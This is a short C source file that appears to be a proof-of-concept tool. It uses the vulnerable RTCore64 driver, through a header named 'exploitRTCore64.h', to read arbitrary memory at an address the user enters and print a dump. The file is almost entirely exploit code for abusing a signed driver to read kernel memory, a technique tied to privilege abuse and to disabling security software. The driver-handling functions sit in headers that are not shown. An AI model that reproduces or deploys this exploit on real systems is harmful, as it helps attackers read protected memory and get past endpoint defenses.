#include <Windows.h>

#include <stdio.h>

#include "exploitRTCore64.h"
#include "utils.h"

int main() {
	if (!openRTCoreDevice()) {
		closeRTCoreDevice();
		return -1;
	}

	DWORD64 address = 0;
	printf("Input target address: ");
	scanf_s("%llx", &address);

	BYTE buffer[64];
	if (!RTCoreReadMemory((DWORD64)address, (BYTE*)&buffer, sizeof(buffer))) {
		printf("[-] Read Memory Failed with error code %lu\r\n", GetLastError());
		return -1;
	}
	displayMemoryDump(buffer, sizeof(buffer));
	closeRTCoreDevice();
	return 0;
}